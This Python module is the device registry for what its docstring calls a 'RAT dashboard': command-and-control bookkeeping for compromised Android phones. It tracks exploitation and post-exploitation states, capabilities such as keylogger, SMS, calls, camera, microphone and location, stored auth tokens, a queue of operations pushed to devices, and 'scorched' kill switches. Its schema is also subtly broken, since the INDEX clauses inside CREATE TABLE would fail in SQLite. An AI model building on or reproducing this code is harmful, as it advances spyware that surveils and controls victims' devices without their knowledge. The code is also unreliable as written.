"""quantum.control.registry — Device state machine + SQLite registry.

Provides persistent device registry with state transitions, telemetry storage,
and capability tracking for the RAT dashboard.
"""
from __future__ import annotations

import json
import sqlite3
from contextlib import contextmanager
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional

from quantum.core.logging import log


class DeviceState(Enum):
    OFFLINE = "offline"
    CONNECTING = "connecting"
    CONNECTED = "connected"
    ENUMERATING = "enumerating"
    SCANNING = "scanning"
    EXPLOITING = "exploiting"
    POSTEXPLOITING = "postexploiting"
    KILLSWITCH_GHOST = "ghost"
    KILLSWITCH_HARD = "hard"
    KILLSWITCH_SCORCHED = "scorched"
    DEAD_MAN = "dead_man"


class DeviceCapabilities(Enum):
    ROOTED = "rooted"
    ADB_WIFI = "adb_wifi"
    ADB_USB = "adb_usb"
    SELinux_PERMISSIVE = "selinux_permissive"
    ACCESSIBILITY = "accessibility"
    DEVICE_ADMIN = "device_admin"
    WIFI = "wifi"
    BLUETOOTH = "bluetooth"
    NFC = "nfc"
    LOCATION = "location"
    CONTACTS = "contacts"
    SMS = "sms"
    CALLS = "calls"
    CAMERA = "camera"
    MICROPHONE = "microphone"
    STORAGE_READ = "storage_read"
    STORAGE_WRITE = "storage_write"
    PHONE_STATE = "phone_state"
    SCREEN_RECORD = "screen_record"
    KEYLOGGER = "keylogger"


@contextmanager
def device_db():
    """Context manager for database operations."""
    conn = sqlite3.connect("data/quantum_device_registry.db", timeout=30)
    conn.row_factory = sqlite3.Row
    try:
        # Enable WAL mode for better concurrency
        conn.execute("PRAGMA journal_mode = WAL")
        conn.execute("PRAGMA synchronous = NORMAL")
        conn.execute("PRAGMA foreign_keys = ON")
        yield conn
    finally:
        conn.close()


class DeviceRegistry:
    """SQLite-based device registry with state machine."""

    def __init__(self):
        self._init_schema()

    def _init_schema(self):
        with device_db() as conn:
            # Devices table
            conn.execute("""
                CREATE TABLE IF NOT EXISTS devices (
                    id TEXT PRIMARY KEY,
                    hostname TEXT NOT NULL,
                    ip TEXT,
                    model TEXT,
                    vendor TEXT,
                    os_version TEXT,
                    os_build TEXT,
                    architecture TEXT,
                    sdk INTEGER,
                    state TEXT NOT NULL DEFAULT 'offline',
                    capabilities TEXT,
                    created_at TIMESTAMP NOT NULL,
                    last_seen TIMESTAMP NOT NULL,
                    first_seen TIMESTAMP NOT NULL,
                    channel TEXT,
                    auth_token TEXT,
                    metadata TEXT,
                    INDEX idx_state (state),
                    INDEX idx_last_seen (last_seen),
                    INDEX idx_vendor_os (vendor, os_version)
                )
            """)

            # State transitions table for audit
            conn.execute("""
                CREATE TABLE IF NOT EXISTS state_transitions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT NOT NULL,
                    from_state TEXT NOT NULL,
                    to_state TEXT NOT NULL,
                    reason TEXT,
                    user_id TEXT,
                    created_at TIMESTAMP NOT NULL,
                    FOREIGN KEY (device_id) REFERENCES devices (id)
                )
            """)

            # Telemetry data table (ring buffer - we'll manage size externally)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS telemetry (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    cpu_total REAL,
                    cpu_per_core TEXT,
                    memory_total REAL,
                    memory_used REAL,
                    memory_available REAL,
                    gpu_temp REAL,
                    battery_level REAL,
                    battery_temp REAL,
                    battery_health TEXT,
                    storage_total REAL,
                    storage_used REAL,
                    network_rx REAL,
                    network_tx REAL,
                    active_connections INTEGER,
                    signal_dbm REAL,
                    wifi_rssi REAL,
                    bluetooth_rssi REAL,
                    FOREIGN KEY (device_id) REFERENCES devices (id)
                )
            """)

            # Tasks table for job queue
            conn.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    id TEXT PRIMARY KEY,
                    device_id TEXT NOT NULL,
                    module TEXT NOT NULL,
                    operation TEXT NOT NULL,
                    args TEXT,
                    state TEXT NOT NULL DEFAULT 'queued',
                    created_at TIMESTAMP NOT NULL,
                    started_at TIMESTAMP,
                    completed_at TIMESTAMP,
                    result TEXT,
                    error TEXT,
                    artifacts TEXT,
                    INDEX idx_device_state (device_id, state),
                    INDEX idx_created (created_at)
                )
            """)

            # Capabilities table for discovered capabilities
            conn.execute("""
                CREATE TABLE IF NOT EXISTS device_capabilities (
                    device_id TEXT NOT NULL,
                    capability TEXT NOT NULL,
                    source TEXT,
                    confidence REAL,
                    evidence TEXT,
                    discovered_at TIMESTAMP NOT NULL,
                    FOREIGN KEY (device_id) REFERENCES devices (id),
                    PRIMARY KEY (device_id, capability)
                )
            """)

            # Kill switches table
            conn.execute("""
                CREATE TABLE IF NOT EXISTS kill_switches (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT NOT NULL,
                    mode TEXT NOT NULL,
                    armed_at TIMESTAMP NOT NULL,
                    triggered_at TIMESTAMP,
                    status TEXT NOT NULL DEFAULT 'pending',
                    FOREIGN KEY (device_id) REFERENCES devices (id)
                )
            """)

            conn.commit()

    def register_device(self, device_id: str, hostname: str, **kwargs) -> bool:
        """Register a new device or update existing one."""
        now = datetime.now().isoformat()
        
        with device_db() as conn:
            cursor = conn.execute(
                "SELECT id, state FROM devices WHERE id = ?",
                (device_id,)
            )
            existing = cursor.fetchone()
            
            if existing:
                # Update existing device
                state = kwargs.get("state", existing["state"])
                if state != existing["state"]:
                    self._log_state_transition(
                        conn, device_id, existing["state"], state, kwargs.get("reason")
                    )
                
                conn.execute(
                    """
                    UPDATE devices 
                    SET hostname = ?, ip = ?, model = ?, vendor = ?, os_version = ?,
                        os_build = ?, architecture = ?, sdk = ?, state = ?,
                        capabilities = ?, channel = ?, auth_token = ?, metadata = ?,
                        last_seen = ?, created_at = ?
                    WHERE id = ?
                    """,
                    (
                        hostname, kwargs.get("ip"), kwargs.get("model"), kwargs.get("vendor"),
                        kwargs.get("os_version"), kwargs.get("os_build"), kwargs.get("architecture"),
                        kwargs.get("sdk"), state, json.dumps(kwargs.get("capabilities", {})),
                        kwargs.get("channel"), kwargs.get("auth_token"), 
                        json.dumps(kwargs.get("metadata", {})), now, existing["created_at"], device_id
                    )
                )
                log(f"Updated device {device_id}: {state}", "DEVICE_REGISTRY")
                return False  # Not a new device
            else:
                # Create new device
                conn.execute(
                    """
                    INSERT INTO devices (
                        id, hostname, ip, model, vendor, os_version, os_build,
                        architecture, sdk, state, capabilities, created_at, last_seen,
                        first_seen, channel, auth_token, metadata
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    (
                        device_id, hostname, kwargs.get("ip"), kwargs.get("model"), 
                        kwargs.get("vendor"), kwargs.get("os_version"), kwargs.get("os_build"),
                        kwargs.get("architecture"), kwargs.get("sdk"), kwargs.get("state", "offline"),
                        json.dumps(kwargs.get("capabilities", {})), now, now, now,
                        kwargs.get("channel"), kwargs.get("auth_token"),
                        json.dumps(kwargs.get("metadata", {}))
                    )
                )
                log(f"Registered new device {device_id} ({hostname})", "DEVICE_REGISTRY")
                return True  # New device

    def _log_state_transition(self, conn, device_id: str, from_state: str, 
                            to_state: str, reason: str):
        """Log a state transition for audit."""
        conn.execute(
            """
            INSERT INTO state_transitions 
            (device_id, from_state, to_state, reason, user_id, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (device_id, from_state, to_state, reason, "operator", datetime.now().isoformat())
        )

    def update_device_state(self, device_id: str, new_state: str, reason: str = None):
        """Update device state and log transition."""
        with device_db() as conn:
            cursor = conn.execute(
                "SELECT state FROM devices WHERE id = ?", (device_id,)
            )
            existing = cursor.fetchone()
            
            if existing and existing["state"] != new_state:
                self._log_state_transition(conn, device_id, existing["state"], 
                                         new_state, reason)
                conn.execute(
                    "UPDATE devices SET state = ? WHERE id = ?",
                    (new_state, device_id)
                )
                log(f"Device {device_id} state: {existing['state']} → {new_state}", 
                    "DEVICE_REGISTRY")

    def get_device(self, device_id: str) -> Optional[Dict]:
        """Get device info by ID."""
        with device_db() as conn:
            cursor = conn.execute(
                "SELECT * FROM devices WHERE id = ?", (device_id,)
            )
            row = cursor.fetchone()
            if row:
                return dict(row)
        return None

    def get_devices(self, state: str = None) -> List[Dict]:
        """Get all devices, optionally filtered by state."""
        with device_db() as conn:
            if state:
                cursor = conn.execute(
                    "SELECT * FROM devices WHERE state = ? ORDER BY last_seen DESC",
                    (state,)
                )
            else:
                cursor = conn.execute(
                    "SELECT * FROM devices ORDER BY last_seen DESC"
                )
            
            return [dict(row) for row in cursor.fetchall()]

    def add_telemetry(self, device_id: str, telemetry_data: Dict):
        """Add telemetry data for a device."""
        telemetry_data["timestamp"] = datetime.now().isoformat()
        
        with device_db() as conn:
            conn.execute(
                """
                INSERT INTO telemetry 
                (device_id, timestamp, cpu_total, cpu_per_core, memory_total,
                 memory_used, memory_available, gpu_temp, battery_level,
                 battery_temp, battery_health, storage_total, storage_used,
                 network_rx, network_tx, active_connections, signal_dbm,
                 wifi_rssi, bluetooth_rssi)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    device_id,
                    telemetry_data.get("timestamp"),
                    telemetry_data.get("cpu_total"),
                    json.dumps(telemetry_data.get("cpu_per_core", {})),
                    telemetry_data.get("memory_total"),
                    telemetry_data.get("memory_used"),
                    telemetry_data.get("memory_available"),
                    telemetry_data.get("gpu_temp"),
                    telemetry_data.get("battery_level"),
                    telemetry_data.get("battery_temp"),
                    telemetry_data.get("battery_health"),
                    telemetry_data.get("storage_total"),
                    telemetry_data.get("storage_used"),
                    telemetry_data.get("network_rx"),
                    telemetry_data.get("network_tx"),
                    telemetry_data.get("active_connections"),
                    telemetry_data.get("signal_dbm"),
                    telemetry_data.get("wifi_rssi"),
                    telemetry_data.get("bluetooth_rssi"),
                )
            )
            
            # Update last_seen
            conn.execute(
                "UPDATE devices SET last_seen = ? WHERE id = ?",
                (telemetry_data["timestamp"], device_id)
            )
            
            # Prune old telemetry (keep last 1000 entries per device)
            self._prune_telemetry(device_id, conn)

    def _prune_telemetry(self, device_id: str, conn):
        """Prune old telemetry entries to maintain ring buffer."""
        conn.execute(
            """
            DELETE FROM telemetry 
            WHERE device_id = ? AND id NOT IN (
                SELECT id FROM telemetry 
                WHERE device_id = ? 
                ORDER BY timestamp DESC 
                LIMIT 1000
            )
            """,
            (device_id, device_id)
        )

    def get_telemetry(self, device_id: str, minutes: int = 60) -> List[Dict]:
        """Get telemetry data for a device over the last N minutes."""
        since = (datetime.now() - timedelta(minutes=minutes)).isoformat()
        
        with device_db() as conn:
            cursor = conn.execute(
                """
                SELECT * FROM telemetry 
                WHERE device_id = ? AND timestamp >= ? 
                ORDER BY timestamp DESC
                """,
                (device_id, since)
            )
            return [dict(row) for row in cursor.fetchall()]

    def create_task(self, device_id: str, module: str, operation: str, 
                   args: Dict = None, task_id: str = None) -> str:
        """Create a new task for a device."""
        from quantum.core.env import generate_id
        
        task_id = task_id or generate_id()
        created_at = datetime.now().isoformat()
        
        with device_db() as conn:
            conn.execute(
                """
                INSERT INTO tasks (id, device_id, module, operation, args, 
                                 state, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    task_id, device_id, module, operation,
                    json.dumps(args or {}), "queued", created_at
                )
            )
            log(f"Created task {task_id} for device {device_id}: {module}.{operation}", 
                "DEVICE_REGISTRY")
        
        return task_id

    def update_task(self, task_id: str, **updates):
        """Update task status or result."""
        updates["completed_at"] = datetime.now().isoformat()
        
        with device_db() as conn:
            set_clause = ", ".join(f"{k} = ?" for k in updates.keys())
            values = list(updates.values())
            values.append(task_id)
            
            conn.execute(
                f"UPDATE tasks SET {set_clause} WHERE id = ?",
                values
            )
            log(f"Updated task {task_id}: {updates}", "DEVICE_REGISTRY")

    def get_task(self, task_id: str) -> Optional[Dict]:
        """Get task by ID."""
        with device_db() as conn:
            cursor = conn.execute(
                "SELECT * FROM tasks WHERE id = ?", (task_id,)
            )
            row = cursor.fetchone()
            if row:
                task = dict(row)
                if task.get("args"):
                    task["args"] = json.loads(task["args"])
                if task.get("result"):
                    task["result"] = json.loads(task["result"])
                if task.get("artifacts"):
                    task["artifacts"] = json.loads(task["artifacts"])
                return task
        return None

    def get_device_tasks(self, device_id: str, limit: int = 50) -> List[Dict]:
        """Get tasks for a device."""
        with device_db() as conn:
            cursor = conn.execute(
                """
                SELECT * FROM tasks 
                WHERE device_id = ? 
                ORDER BY created_at DESC 
                LIMIT ?
                """,
                (device_id, limit)
            )
            tasks = []
            for row in cursor.fetchall():
                task = dict(row)
                if task.get("args"):
                    task["args"] = json.loads(task["args"])
                if task.get("result"):
                    task["result"] = json.loads(task["result"])
                if task.get("artifacts"):
                    task["artifacts"] = json.loads(task["artifacts"])
                tasks.append(task)
            return tasks

    def add_device_capability(self, device_id: str, capability: str, 
                            source: str, confidence: float, evidence: str):
        """Add a discovered capability for a device."""
        with device_db() as conn:
            conn.execute(
                """
                INSERT OR REPLACE INTO device_capabilities 
                (device_id, capability, source, confidence, evidence, discovered_at)
                VALUES (?, ?, ?, ?, ?, ?)
                """,
                (
                    device_id, capability, source, confidence, evidence,
                    datetime.now().isoformat()
                )
            )
            
            # Update capabilities JSON in devices table
            cursor = conn.execute(
                "SELECT capabilities FROM devices WHERE id = ?", (device_id,)
            )
            row = cursor.fetchone()
            if row:
                caps = json.loads(row["capabilities"] or "{}")
                caps[capability] = {
                    "source": source,
                    "confidence": confidence,
                    "evidence": evidence,
                    "discovered_at": datetime.now().isoformat()
                }
                conn.execute(
                    "UPDATE devices SET capabilities = ? WHERE id = ?",
                    (json.dumps(caps), device_id)
                )

    def get_device_capabilities(self, device_id: str) -> Dict:
        """Get all capabilities for a device."""
        with device_db() as conn:
            cursor = conn.execute(
                "SELECT * FROM device_capabilities WHERE device_id = ?",
                (device_id,)
            )
            return {row["capability"]: dict(row) for row in cursor.fetchall()}

    def add_kill_switch(self, device_id: str, mode: str):
        """Add a kill switch for a device."""
        with device_db() as conn:
            conn.execute(
                """
                INSERT INTO kill_switches (device_id, mode, armed_at, status)
                VALUES (?, ?, ?, ?)
                """,
                (device_id, mode, datetime.now().isoformat(), "pending")
            )
            log(f"Kill switch armed for device {device_id}: mode={mode}", "DEVICE_REGISTRY")

    def get_device_kill_switches(self, device_id: str) -> List[Dict]:
        """Get all kill switches for a device."""
        with device_db() as conn:
            cursor = conn.execute(
                "SELECT * FROM kill_switches WHERE device_id = ? ORDER BY armed_at DESC",
                (device_id,)
            )
            return [dict(row) for row in cursor.fetchall()]

    def log_state_transitions(self, device_id: str, limit: int = 100) -> List[Dict]:
        """Get state transition history for a device."""
        with device_db() as conn:
            cursor = conn.execute(
                """
                SELECT * FROM state_transitions 
                WHERE device_id = ? 
                ORDER BY created_at DESC 
                LIMIT ?
                """,
                (device_id, limit)
            )
            return [dict(row) for row in cursor.fetchall()]

    def cleanup_old_devices(self, days_old: int = 30):
        """Clean up devices that haven't been seen in N days."""
        cutoff = (datetime.now() - timedelta(days=days_old)).isoformat()
        
        with device_db() as conn:
            cursor = conn.execute(
                "SELECT COUNT(*) as count FROM devices WHERE last_seen < ?",
                (cutoff,)
            )
            count = cursor.fetchone()["count"]
            
            if count > 0:
                conn.execute(
                    "DELETE FROM devices WHERE last_seen < ?",
                    (cutoff,)
                )
                log(f"Cleaned up {count} old devices (last_seen < {cutoff})", 
                    "DEVICE_REGISTRY")
                return count
        return 0